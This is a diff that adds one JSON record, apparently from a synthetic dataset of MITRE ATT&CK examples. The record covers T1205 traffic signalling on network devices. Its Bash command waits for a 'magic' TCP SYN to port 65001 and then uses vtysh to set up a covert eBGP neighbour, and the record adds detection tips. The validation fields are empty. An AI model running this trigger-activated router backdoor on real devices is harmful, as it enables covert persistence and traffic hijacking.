@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo bash -c 'tcpdump -ni eth0 -l \"tcp[tcpflags] & tcp-syn != 0 and dst port 65001\" -c 1 && vtysh -c \"conf t\" -c \"router bgp 65000\" -c \"neighbor 203.0.113.50 remote-as 65001\" -c \"neighbor 203.0.113.50 ebgp-multihop 2\" -c \"address-family ipv4 unicast\" -c \"neighbor 203.0.113.50 activate\"'",
+  "explanation": "Uses a magic TCP SYN to high port 65001 as a signal to auto-enable an eBGP neighbor via vtysh, creating a covert routing channel. Detection: monitor unusual SYNs to 65001 inbound to the device and track configuration-mode entries plus BGP neighbor changes in FRR logs.",
+  "rationale_steps": [
+    "Sniff for a TCP SYN to a designated magic port as the activation signal.",
+    "On trigger, configure a BGP neighbor using vtysh to establish a covert lateral routing path.",
+    "Detect with NetFlow for SYNs to 65001 and FRR daemons' configuration and neighbor state-change logs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-e71f7f24-f9de8bbb",
+  "source_prompt_hash": "e71f7f24",
+  "timestamp_utc": "2025-09-30T06:04:49.943820Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
